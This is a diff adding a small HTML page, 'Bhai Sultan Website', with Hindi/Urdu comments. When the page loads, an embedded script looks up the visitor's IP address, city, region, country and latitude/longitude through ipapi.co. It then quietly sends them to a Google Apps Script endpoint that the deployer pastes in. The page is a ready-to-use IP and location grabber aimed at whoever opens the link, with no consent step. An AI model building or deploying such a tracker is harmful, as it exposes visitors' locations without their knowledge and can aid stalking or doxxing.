@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bhai Sultan Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Bhai Sultan's Website </h1>
+    <p>Yaha aap aaye, aur humne aapka location record kar liya </p>
+
+    <script>
+        // Pehle visitor ka IP/location le rahe hai
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                let params = new URLSearchParams({
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    lat: data.latitude,
+                    lon: data.longitude
+                });
+
+                // Apne Google Script ka URL yaha paste karo
+                fetch("YOUR_GOOGLE_SCRIPT_URL?" + params.toString());
+            })
+            .catch(err => console.error("Location fetch error:", err));
+    </script>
+</body>
+</html>
